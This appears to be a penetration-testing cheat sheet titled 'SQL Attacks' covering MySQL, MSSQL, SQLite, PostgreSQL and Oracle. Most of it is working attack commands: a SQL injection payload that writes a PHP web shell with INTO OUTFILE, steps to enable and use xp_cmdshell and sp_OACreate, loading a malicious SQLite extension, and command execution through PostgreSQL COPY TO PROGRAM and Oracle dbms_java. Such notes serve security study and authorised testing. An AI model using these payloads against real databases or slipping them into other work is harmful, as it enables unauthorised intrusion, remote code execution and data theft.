---
layout: blank
pagetitle: SQL Attacks
---

**MySQL**
- MariaDB is an open-source fork
- `mysql -u {username} -p -h {host IP} -P {port}`
- Specifying multiple parameters `SELECT user, passhash FROM mysql.user WHERE user = '{username}'`
- Enumeration:
	- List all databases: `SELECT * FROM information_schema.tables;`
	- Version: `SELECT @@version;`
	- Current user: `SELECT system_user();`
- MySQL RCE via SQLi
	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
			- `tmp` is important, because we might not have perms for `/html`
		- Then, either LFI the new file or straight up access it if possible
	- Can also extract users/passwords and crack hashes
	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)


**MSSQL**
- Database management built into Windows
- Command-line tool `SQLCMD` allows SQL queries through cmd
- Kali has `impacket-mssqlclient` to connect to MSSQL databases
	- `impacket-mssqlclient {username}@{host IP} -windows-auth`
		- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
			- This can be enabled by a user with permissions with 
			- `EXECUTE sp_configure 'show advanced options', 1; 
				- Showing advanced options is actually required to run xp_cmdshell
			- `RECONFIGURE;` 
			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
			- `RECONFIGURE;`
			- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
	- `-windows-auth` forces the use of NTLM auth (rather than Kerberos)
- List all databases: 
	- `SELECT name FROM sys.databases;`
	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
		- `dbo` is a table schema
- Can also use `sp_OACreate` to execute commands
	`EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
- Linked servers can execute remote queries (MSSqlPwner)

**SQLite**
- Use `sqlitebrowser` for viewing sqlite databases
- Can't execute functions, but can load malicious files
	- `SELECT load_extension('/tmp/malicious.so');`
- `SQLite CLI` allows command execution with `.shell {command}` or `.system {command}`
- Outdated versions may have RCE CVEs

**PostgreSQL**
- Use `psql` for to connect to PostgreSQL databases
- Command execution with `COPY mytable TO PROGRAM 'whoami';`
	- Requires superuser
- Command execution with `SELECT pg_execute_server_program('id');`
	- This won't require superuser, but will require `pg_execute_server_program`

**Oracle**
- Comand execution with `EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec("{command}")');`